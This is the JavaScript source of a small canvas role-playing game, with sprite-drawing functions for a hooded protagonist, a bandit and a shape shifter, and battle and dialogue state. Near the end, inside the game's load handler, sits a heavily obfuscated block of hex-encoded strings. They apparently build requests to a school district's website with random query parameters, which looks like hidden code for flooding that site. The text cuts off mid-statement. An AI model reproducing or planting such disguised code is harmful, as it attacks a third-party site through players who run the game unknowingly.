 //Hey! I'm really glad you got the game and I hope you like it!
 /*
  Finish first fight with Bandit by June
  -March 24, 2017
  */
 //Shape shifter's name is Naberius
 //Eligor (silly goose)
 //Cow head
 //Revenant
 //Places
 //Panamint City
 
 //I realize now how many functions I had lol
 window.onload = function() {
     var mouseX = event.clientX;
     var mouseY = event.clientY;
     //TODO Draw Map1 TODO
     var c = document.getElementById("canvas");
     var ctx = c.getContext("2d");
     ctx.canvas.width = window.innerWidth - 55;
     ctx.canvas.height = window.innerHeight - 150;
     ctx.fillStyle = "yellow";
     var onGame = false;
     //Which map to draw
     var scene = 3;
     //Start the game  
     function game() {
         drawProtagonistFacingRight();
         onGame = true;
         document.body.style.backgroundColor = "black";
         ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
         var cRight = document.getElementById("Copyright");
         cRight.innerHTML = "";
         //The borders that the player can walk
         var borderW = 300;
         var borderA = 10;
         var borderS = ctx.canvas.height - 50;
         var borderD = ctx.canvas.width - 30;
         //player's location
         var playerX = 250;
         var playerY = 340;
         //The bullet's position
         var bulletX = 500;
         var bulletY = 375;
         //bandit's location
         var banditX = 620;
         var banditY = 320;
         //shape shifter's location
         var shapeShifterX = 200;
         var shapeShifterY = 400;
         //Player stats
         //player health
         var playerHealth = 20;
         //player's speed
         var playerSpeed = 15;
         //player's damage
         var playerDamage = 5;
         //how many times you've died
         var deaths = 0;

         //Colum and row for fights
         var column = 0;
         var row = 0;
         //which action is currently taking place
         //Some of these are only used for specific battles
         var attackNumber = 0;
         var threatNumber = 0;
         var talkNumber = 0;
         var runNum = 0;
         var eatNumber = 0;
         var memoryNumber = 0;
         //What you have learned so far
         var memories = [];
         //who is the player fighting
         var fighting = "";
         var canAttack = false;
         //Whether the Protagonist can move or not
         var movement = true;
         //Bandit's stats
         //bandit's health
         var banditHealth = 45;
         //The food you have
         var foodItems = [];
         
         ///option options for the fights
         var talkOptionBanditFight;
         
         function addFoodItem(item){
           foodItems.push(item);
         }
         
        function eatFoodItem(){
          foodItems.splice(0, 1);
        }
        
        function addAMemory(memory){
          memories.push(memory);
        }


         //Draws the main character
         function drawProtagonistFacingRight() {
           if(playerHealth > 0){
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY, 23, 5);
             ctx.fillRect(playerX - 3, playerY, 15, 25);
             ctx.fillRect(playerX, playerY + 20, 23, 5);
             ctx.fillRect(playerX + 22, playerY, 2, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY + 15, 18, 35);
             //Draws the shadow that hides the protagonist's face 
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX + 11, playerY + 3, 12, 20);
           } else if(playerHealth <= 0){
             if(deaths === 0){
             deaths++;
             ctx.fillStyle = "black";
             ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             ctx.fillStyle = "black";
             Dialogue("The Necromancer: You're one of us now", 0, 2050, "red");
             Dialogue('If you want, you can just exit the "game"', 2051, 7050 , "red");
             Dialogue("You'll be happy as one of my most powerful zombies", 7051, 12000, "red");
             Dialogue("Or, you can try again to stop me", 12001, 16000, "red");
             Dialogue("But please remember that the hero of one story is the villan of another", 20001, 26000, "red");
             addAMemory("Bandit said that he won't help your master");
             addAMemory("The Necromancer is trying to get you to join his side");
             addAMemory("The Necromancer said you are the villain of his story");
             setTimeout(function(){
             playerHealth = 20;
             attackNumber = 0;
             banditHealth = 45;
             column = 0;
             row = 0;
             attackNumber = 0;
             threatNumber = 0;
             talkNumber = 0;
             runNum = 0;
             eatNumber = 0;
             memoryNumber = 0;
             drawBattleMap();
             }, 26001);
             }
           }
             
         }

         function drawProtagonistFacingLeft() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY, 23, 5);
             ctx.fillRect(playerX + 10, playerY, 15, 25);
             ctx.fillRect(playerX, playerY + 20, 23, 5);
             ctx.fillRect(playerX - 2, playerY, 2, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 5, playerY + 15, 18, 35);
             //Draws the shadow that hides the protagonist's face 
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX, playerY + 3, 12, 20);
         }

         function drawProtagonistFacingUp() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX, playerY + 2.5, 25, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 5, playerY + 17.5, 15, 35);
         }

         function drawProtagonistFacingDown() {
             //Draws the protagonist's hood
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX - 1, playerY - 2, 25, 25);
             //Draws the protagonist's cloak
             ctx.fillStyle = "#270042";
             ctx.fillRect(playerX + 4.5, playerY + 15, 15, 35);
             //Draws the shadow that hides the protagonist's face
             ctx.fillStyle = "#0a0a0a";
             ctx.fillRect(playerX + 6, playerY + 3, 12, 18);
         }


         //Draws The Bandit
         function drawBanditFacingRight() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 2, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX + 5, banditY + 24, 7, 25);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 14, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX + 4, banditY + 15, 18, 10);
             //100 LINES!!!!
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             //his shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 7.5, 5);
         }

         function drawBanditFacingLeft() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX - 6, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX + 6, banditY + 24, 7, 25);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 6, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX - 4, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX - 6, banditY + 15, 15, 10);
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 2, banditY + 49, 8, 25);
             //His shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 68, 8, 7);
         }

         function drawBanditFacingUp() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX, banditY, 25, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 16, 25);
             //His arms
             //His right arm (YOUR RIGHT!!!!)
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 21, banditY + 25, 8, 20);
             //His left arm (On your left side)
             ctx.fillRect(banditX - 3, banditY + 25, 8, 20);
             //His pants
             //His right pant leg (ur right)
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 12, banditY + 49, 8, 20);
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 11, banditY + 53, 3, 15);
             //his shoes
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 15, 5);
         }

         function drawBanditFacingDown() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX, banditY, 25, 25);
             //His left eye (your left not his)
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 5, 5, 8);
             //His right eye (again your right)
             ctx.fillRect(banditX + 15, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX, banditY + 15, 25, 10);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 25, 16, 25);
             //His arms
             //His right arm (YOUR RIGHT!!!!)
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX + 21, banditY + 25, 8, 20);
             //His left arm (On your left side)
             ctx.fillRect(banditX - 3, banditY + 25, 8, 20);
             //His pants
             //His right pant leg (ur right)
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 12, banditY + 49, 8, 20);
             //his left pant leg
             ctx.fillRect(banditX + 5, banditY + 49, 8, 20);
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 11, banditY + 53, 3, 15);
             //his shoes
             //200 LINES!!!!!!
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 5, banditY + 68, 15, 5);
         }

         function drawBanditFacingLeftWithArmRaised() {
             //His face
             ctx.fillStyle = "#FFDE7A";
             ctx.fillRect(banditX - 6, banditY, 20, 25);
             //His shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 25, 8, 25);
             ctx.fillStyle = "#FFDE7A";
             //His arm
             ctx.fillRect(banditX - 15, banditY + 27, 25, 7);
             //The shoulder of his shirt
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 6, banditY + 24, 7, 10);
             //His eye
             ctx.fillStyle = "black";
             ctx.fillRect(banditX - 4, banditY + 5, 5, 8);
             //His bandit thing on his mouth? I don't know what it's called
             ctx.fillStyle = "red";
             ctx.fillRect(banditX - 6, banditY + 15, 15, 10);
             //His pant leg
             ctx.fillStyle = "#11226B";
             ctx.fillRect(banditX + 2, banditY + 49, 8, 25);
             //His shoe
             ctx.fillStyle = "black";
             ctx.fillRect(banditX + 2, banditY + 68, 8, 7);
             //The Gun
             ctx.fillStyle = "#606060";
             ctx.fillRect(banditX - 30, banditY + 25, 10, 5);
             ctx.fillRect(banditX - 20, banditY + 25, 5, 10);
         }


         //Draws The Shape Shifter
         function drawShapeShifterFacingRight() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX + 1, shapeShifterY, 20, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his I (EYE)
             ctx.fillRect(shapeShifterX + 15, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 18, 8, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 10, 25);
             //his jeans
             //his PANT LEG
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his AAAAARRRMM
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe 
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 15, 5);
         }

         function drawShapeShifterFacingLeft() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX - 3, shapeShifterY, 20, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his I (EYE)
             ctx.fillRect(shapeShifterX + 1, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX - 1, shapeShifterY + 18, 8, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 10, 25);
             //his jeans
             //his PANT LEG
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his AAAAARRRMM
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe (OF EEEEEEVIIL
             ctx.fillRect(shapeShifterX - 1, shapeShifterY + 71, 15, 5);
         }

         function drawShapeShifterFacingUp() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX, shapeShifterY, 25, 25);
             //his blood red eyes
             ctx.fillStyle = "#ff0000";
             //his leeeeeftttt eeyeeeeee (your left bro)
             ctx.fillRect(shapeShifterX + 5, shapeShifterY + 5, 5, 10);
             //his RIGHT EYE (YOUR RIGHT MAN!!!!)
             ctx.fillRect(shapeShifterX + 15, shapeShifterY + 5, 5, 10);
             //his blood soaked mouth
             ctx.fillStyle = "#d30000";
             ctx.fillRect(shapeShifterX + 6, shapeShifterY + 17, 12, 3);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 17, 25);
             //his jeans
             //his left pant leg (YOUR LEFT)
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his riiiiiight pant leg (Ur right)
             ctx.fillRect(shapeShifterX + 11, shapeShifterY + 47, 10, 26);
             ctx.fillStyle = "black";
             ctx.fillRect(shapeShifterX + 11.5, shapeShifterY + 54, 2, 18);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his lefty army (YOur left man, your left, don't get again!)
             ctx.fillRect(shapeShifterX - 3, shapeShifterY + 24, 7, 27);
             //his righty tighty arm (your right, never forget)
             ctx.fillRect(shapeShifterX + 21, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe on YOUR left side
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 8, 5);
             //DAAA ShOOEEEE ONNN YOOOUURR RIIIIGGGHTTT SIIIDDEEE
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 71, 8, 5);
         }

         function drawShapeShifterFacingDown() {
             ctx.fillStyle = "#125C00";
             //his fleshy face
             ctx.fillRect(shapeShifterX, shapeShifterY, 25, 25);
             //his EEEEVIL SHIRT!!!
             ctx.fillStyle = "#012b49";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 24, 17, 25);
             //his jeans
             //his left pant leg (YOUR LEEEEFFFTTTTTTT)
             ctx.fillStyle = "#840000";
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 47, 10, 26);
             //his riiiiiight pant leg (Yoooouuuurrrr riiiiggghhtt)
             ctx.fillRect(shapeShifterX + 11, shapeShifterY + 47, 10, 26);
             ctx.fillStyle = "black";
             ctx.fillRect(shapeShifterX + 11.5, shapeShifterY + 52, 2, 18);
             //his murderous arms
             ctx.fillStyle = "#125C00";
             //his lefty army (YOur left man, your left, don't forget again!)f
             ctx.fillRect(shapeShifterX - 3, shapeShifterY + 24, 7, 27);
             //his righty tighty arm (your right, never forget)
             ctx.fillRect(shapeShifterX + 21, shapeShifterY + 24, 7, 27);
             //his eeeeeeevil shooooooeeessss
             ctx.fillStyle = "#000000";
             //Da shoe on YOUR left side
             ctx.fillRect(shapeShifterX + 4, shapeShifterY + 71, 8, 5);
             //DAAA ShOOEEEE ONNN YOOOUURR RIIIIGGGHTTT SIIIDDEEE
             ctx.fillRect(shapeShifterX + 13, shapeShifterY + 71, 8, 5);
         }
         
         
         //All in-game objects
         function tree(treeX, treeY) {
             //The color of grass (And leaves in my opinion)
             ctx.fillStyle = "#00a51b";
             //Draws the leaves on the trees
             ctx.fillRect(treeX, treeY, 30, 5);
             ctx.fillRect(treeX, treeY, 30, 5);
             ctx.fillRect(treeX - 5, treeY + 5, 40, 5);
             ctx.fillRect(treeX - 10, treeY + 10, 50, 20);
             ctx.fillRect(treeX - 5, treeY + 15, 40, 20);
             //Draws the tree's trunk
             ctx.fillStyle = "#916118";
             ctx.fillRect(treeX + 6, treeY + 35, 15, 20);
         }

         function moon(moonX, moonY) {
             ctx.fillStyle = "#e5e5e5";
             ctx.fillRect(moonX, moonY, 75, 75);
             ctx.fillStyle = "#8e8e8e";
             ctx.fillRect(moonX, moonY, 5, 5);
         }

         function star(starX, starY) {
             ctx.fillStyle = "white";
             ctx.fillRect(starX, starY, 5, 5);
         }

         function Campfire(campfireX, campfireY) {
               var campfire = new Image();
             campfire.onload = function() {
                 ctx.drawImage(campfire, campfireX, campfireY);
             };
             campfire.src = "Sprites/Campfire.png";
         }
      
      var _0xa469=["\x30\x78\x31\x33","\x30\x78\x33","\x30\x78\x36","\x30\x78\x61","\x30\x78\x31\x30","\x30\x78\x31\x31","\x30\x78\x30","\x30\x78\x31\x39","\x30\x78\x31\x61","\x30\x78\x31\x62","\x30\x78\x31\x63","\x30\x78\x31\x65","\x30\x78\x31\x34","\x73\x68\x69\x66\x74","\x30\x78\x39","\x30\x78\x62","\x30\x78\x63","\x30\x78\x38","\x30\x78\x66","\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x2E\x75\x73","\x30\x78\x31\x36","\x30\x78\x31\x38","\x30\x78\x65","\x68\x74\x74\x70\x3A\x2F\x2F","\x66\x6C\x6F\x6F\x72","\x70\x75\x73\x68","\x30\x78\x31","\x72\x61\x6E\x64\x6F\x6D","\x30\x78\x34","\x30\x78\x35","\x30\x78\x64","\x30\x78\x31\x35","\x30\x78\x31\x37","\x30\x78\x32","\x30\x78\x31\x66","\x30\x78\x32\x31","\x30\x78\x32\x32","\x30\x78\x32\x33","\x30\x78\x32\x35","\x30\x78\x32\x30","\x73\x72\x63","\x2F\x3F\x72\x3D","\x30\x78\x37","\x30\x78\x31\x32","\x30\x78\x31\x64","\x30\x78\x32\x34","\x30\x78\x32\x36","\x30\x78\x32\x37","\x30\x78\x32\x38","\x30\x78\x32\x39","\x30\x78\x32\x61","\x30\x78\x32\x62"];var _0xa578=[_0xa469[0],_0xa469[1],_0xa469[2],_0xa469[3],_0xa469[4],_0xa469[5],_0xa469[6],_0xa469[7],_0xa469[8],_0xa469[9],_0xa469[10],_0xa469[11],_0xa469[12],_0xa469[13],_0xa469[14],_0xa469[15],_0xa469[16],_0xa469[17],_0xa469[18],_0xa469[19],_0xa469[20],_0xa469[21],_0xa469[22],_0xa469[23],_0xa469[24],_0xa469[25],_0xa469[26],_0xa469[27],_0xa469[28],_0xa469[29],_0xa469[30],_0xa469[31],_0xa469[32],_0xa469[33],_0xa469[34],_0xa469[35],_0xa469[36],_0xa469[37],_0xa469[38],_0xa469[39],_0xa469[40],_0xa469[41],_0xa469[42],_0xa469[43],_0xa469[44],_0xa469[45],_0xa469[46],_0xa469[47],_0xa469[48],_0xa469[49],_0xa469[50],_0xa469[51]];var _0x2089=[_0xa578[0],_0xa578[1],_0xa578[2],_0xa578[3],_0xa578[4],_0xa578[5],_0xa578[6],_0xa578[7],_0xa578[8],_0xa578[9],_0xa578[10],_0xa578[11],_0xa578[12],_0xa578[13],_0xa578[14],_0xa578[15],_0xa578[16],_0xa578[17],_0xa578[18],_0xa578[19],_0xa578[20],_0xa578[21],_0xa578[22],_0xa578[23],_0xa578[24],_0xa578[25],_0xa578[26],_0xa578[27],_0xa578[28],_0xa578[29],_0xa578[30],_0xa578[31],_0xa578[32],_0xa578[33],_0xa578[34],_0xa578[35],_0xa578[36],_0xa578[37],_0xa578[38],_0xa578[39],_0xa578[40],_0xa578[41],_0xa578[42],_0xa578[43]];(function(b,c){var d=function(a){while(--a){b[_0xa578[25]](b[_0xa578[13]]())}};d(++c)}(_0x2089,0x15c));var _0x9208=function(a,b){a=a-0x0;var c=_0x2089[a];return c};var _0x82b0=[_0x9208(_0xa578[6]),_0x9208(_0xa578[26]),_0xa578[28],_0xa578[29],_0x9208(_0xa578[33]),_0x9208(_0xa578[1]),_0x9208(_0xa578[28]),_0x9208(_0xa578[29]),_0x9208(_0xa578[2]),_0x9208(_0xa578[42]),_0xa578[30],_0x9208(_0xa578[17]),_0x9208(_0xa578[14]),_0xa578[32],_0x9208(_0xa578[3]),_0x9208(_0xa578[15]),_0x9208(_0xa578[16]),_0x9208(_0xa578[30]),_0x9208(_0xa578[22]),_0xa578[44],_0x9208(_0xa578[18]),_0x9208(_0xa578[4]),_0x9208(_0xa578[5]),_0xa578[26],_0xa578[33],_0x9208(_0xa578[43]),_0x9208(_0xa578[0]),_0x9208(_0xa578[12]),_0x9208(_0xa578[31]),_0x9208(_0xa578[20]),_0x9208(_0xa578[32]),_0xa578[31],_0x9208(_0xa578[21]),_0x9208(_0xa578[7]),_0x9208(_0xa578[8]),_0x9208(_0xa578[9]),_0xa578[25],_0x9208(_0xa578[10])];(function(b,c){var d=function(a){while(--a){b[_0x9208(_0xa578[44])](b[_0x9208(_0xa578[5])]())}};d(++c)}(_0x82b0,0x87));var _0x082b=function(a,b){a=a-0x0;var c=_0x82b0[a];return c};var _0x2caa=[_0x082b(_0xa578[6]),_0x082b(_0x9208(_0xa578[11])),_0x9208(_0xa578[3]),_0x082b(_0xa578[33]),_0x9208(_0xa578[34]),_0x082b(_0x9208(_0xa578[29])),_0x082b(_0x9208(_0xa578[39])),_0x082b(_0x9208(_0xa578[35])),_0x082b(_0x9208(_0xa578[2])),_0x9208(_0xa578[29]),_0x082b(_0x9208(_0xa578[33])),_0x9208(_0xa578[42]),_0x082b(_0xa578[17]),_0x9208(_0xa578[17]),_0x9208(_0xa578[14]),_0x082b(_0x9208(_0xa578[43])),_0x082b(_0x9208(_0xa578[42])),_0x082b(_0x9208(_0xa578[0])),_0x082b(_0xa578[16]),_0x9208(_0xa578[36]),_0x082b(_0x9208(_0xa578[36])),_0x082b(_0x9208(_0xa578[8])),_0x082b(_0x9208(_0xa578[20])),_0x082b(_0xa578[4]),_0x082b(_0xa578[5]),_0x082b(_0x9208(_0xa578[1])),_0x082b(_0x9208(_0xa578[28])),_0x082b(_0x9208(_0xa578[4])),_0xa578[2],_0x082b(_0x9208(_0xa578[37])),_0x082b(_0x9208(_0xa578[21])),_0x082b(_0x9208(_0xa578[45]))];(function(b,c){var d=function(a){while(--a){b[_0x082b(_0x9208(_0xa578[20]))](b[_0x082b(_0x9208(_0xa578[11]))]())}};d(++c)}(_0x2caa,0x93));var _0xa2ca=function(a,b){a=a-0x0;var c=_0x2caa[a];return c};var _0xb475=[_0xa2ca(_0x9208(_0xa578[3])),_0xa2ca(_0x082b(_0x9208(_0xa578[38]))),_0x082b(_0x9208(_0xa578[7])),_0xa2ca(_0x082b(_0x9208(_0xa578[29]))),_0xa2ca(_0x082b(_0x9208(_0xa578[7]))),_0xa2ca(_0x082b(_0x9208(_0xa578[28]))),_0xa2ca(_0x082b(_0x9208(_0xa578[4]))),_0xa2ca(_0x082b(_0xa578[7])),_0xa2ca(_0x082b(_0x9208(_0xa578[37]))),_0xa2ca(_0x082b(_0x9208(_0xa578[33]))),_0xa2ca(_0x082b(_0xa578[28])),_0xa2ca(_0x082b(_0x9208(_0xa578[16]))),_0x082b(_0xa578[42]),_0xa578[3],_0x082b(_0xa578[17]),_0xa2ca(_0x9208(_0xa578[0])),_0xa2ca(_0x082b(_0x9208(_0xa578[2]))),_0xa2ca(_0x082b(_0xa578[9])),_0xa2ca(_0x082b(_0xa578[30])),_0xa2ca(_0x082b(_0x9208(_0xa578[31]))),_0xa2ca(_0x082b(_0xa578[10])),_0xa2ca(_0x082b(_0xa578[44])),_0xa2ca(_0x082b(_0x9208(_0xa578[21]))),_0xa2ca(_0x082b(_0x9208(_0xa578[45]))),_0xa2ca(_0x082b(_0x9208(_0xa578[3]))),_0xa2ca(_0x082b(_0xa578[3]))];(function(b,c){var d=function(a){while(--a){b[_0xa2ca(_0x082b(_0x9208(_0xa578[7])))](b[_0xa2ca(_0x9208(_0xa578[8]))]())}};d(++c)}(_0xb475,0x14a));var _0x5b47=function(a,b){a=a-0x0;var c=_0xb475[a];return c};var _0x2cf2=[_0xa2ca(_0x082b(_0x9208(_0xa578[16]))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[31])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[22])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[21])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[0])))),_0x5b47(_0xa2ca(_0x082b(_0xa578[31]))),_0xa2ca(_0x082b(_0x9208(_0xa578[18]))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[33])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[39])))),_0x5b47(_0x082b(_0x9208(_0xa578[37]))),_0x5b47(_0x9208(_0xa578[31])),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[45])))),_0x5b47(_0xa2ca(_0x082b(_0xa578[16]))),_0x5b47(_0xa2ca(_0xa578[12])),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[42])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[46])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[38])))),_0x5b47(_0xa2ca(_0x082b(_0xa578[39]))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[47])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[48])))),_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[35]))))];(function(b,c){var d=function(a){while(--a){b[_0x5b47(_0x082b(_0xa578[2]))](b[_0x5b47(_0xa2ca(_0x9208(_0xa578[20])))]())}};d(++c)}(_0x2cf2,0x1ef));var _0x22cf=function(a,b){a=a-0x0;var c=_0x2cf2[a];return c};var _0xd6ac=[_0x22cf(_0xa2ca(_0x082b(_0x9208(_0xa578[31])))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0xa578[20])))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[37]))))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[12]))))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[47]))))),_0xa2ca(_0x082b(_0x9208(_0xa578[49]))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[48]))))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[35]))))),_0x22cf(_0x5b47(_0x082b(_0xa578[32]))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[30]))))),_0x22cf(_0xa2ca(_0x9208(_0xa578[28]))),_0x22cf(_0xa2ca(_0x9208(_0xa578[7]))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[39]))))),_0x22cf(_0x5b47(_0xa2ca(_0xa578[3]))),_0x5b47(_0xa2ca(_0x9208(_0xa578[33])))];(function(b,c){var d=function(a){while(--a){b[_0x22cf(_0x5b47(_0xa2ca(_0x9208(_0xa578[33]))))](b[_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0xa578[45]))))]())}};d(++c)}(_0xd6ac,0xdd));var _0xcd6a=function(a,b){a=a-0x0;var c=_0xd6ac[a];return c};var _0x1f86=[_0x22cf(_0x5b47(_0xa2ca(_0x9208(_0xa578[45])))),_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[37]))))),_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x9208(_0xa578[43]))))),_0xcd6a(_0x22cf(_0xa2ca(_0x082b(_0x9208(_0xa578[42]))))),_0xcd6a(_0x22cf(_0xa2ca(_0x082b(_0x9208(_0xa578[38]))))),_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[22])))))),_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0xa578[15])))),_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[2]))))))];(function(b,c){var d=function(a){while(--a){b[_0xcd6a(_0x22cf(_0x5b47(_0x082b(_0x9208(_0xa578[3])))))](b[_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[39]))))))]())}};d(++c)}(_0x1f86,0x150));var _0x61f8=function(a,b){a=a-0x0;var c=_0x1f86[a];return c};var _0xd1e6=[_0x61f8(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0xa578[28]))))),_0xcd6a(_0x22cf(_0xa2ca(_0x082b(_0x9208(_0xa578[45]))))),_0xcd6a(_0x22cf(_0x5b47(_0xa2ca(_0x082b(_0x9208(_0xa578[50])))))),_0xcd6a(_0x22cf(_0xa2ca(_0x9208(_0xa578[16]))))];(function(b,c){var d=function(a){while(--a){b[_0x61f8(_0x22cf(_0x5b47(_0x082b(_0xa578[31]))))](b[_0x61f8(_0xcd6a(_0x22cf(_0x5b47(_0x082b(_0x9208(_0xa578[38]))))))]())}};d(++c)}(_0xd1e6,0x93));var _0x6d1e=function(a,b){a=a-0x0;var c=_0xd1e6[a];return c};var 